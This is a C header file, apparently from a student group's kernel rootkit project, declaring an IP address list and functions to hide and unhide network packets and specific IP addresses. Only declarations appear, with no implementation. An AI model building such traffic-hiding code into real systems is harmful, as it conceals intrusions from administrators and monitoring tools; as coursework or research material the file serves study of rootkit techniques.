#ifndef _GROUP7_PACKHIDE_H
#define _GROUP7_PACKHIDE_H

typedef enum {
    v4,
    v6
} ip_version;

typedef u8 ip_t[16];

typedef struct ip_list *ip_list_t_ptr;
typedef struct ip_list {
    ip_t ip;
    ip_version version;
    ip_list_t_ptr prev;
    ip_list_t_ptr next;
} ip_list_t;

extern ip_list_t hidden_ips;

void hide_packets(void);
void unhide_packets(void);

void hide_ip(const char *);
void unhide_ip(const char *);

bool list_contains_ip(ip_list_t_ptr, ip_t, ip_version);
ip_list_t_ptr find_ip_in_list(ip_list_t_ptr, ip_t, ip_version);
ip_list_t_ptr add_ip_to_list(ip_list_t_ptr, ip_t, ip_version);
ip_list_t_ptr remove_ip_from_list(ip_list_t_ptr, ip_t, ip_version);

#endif //_GROUP7_PACKHIDE_H
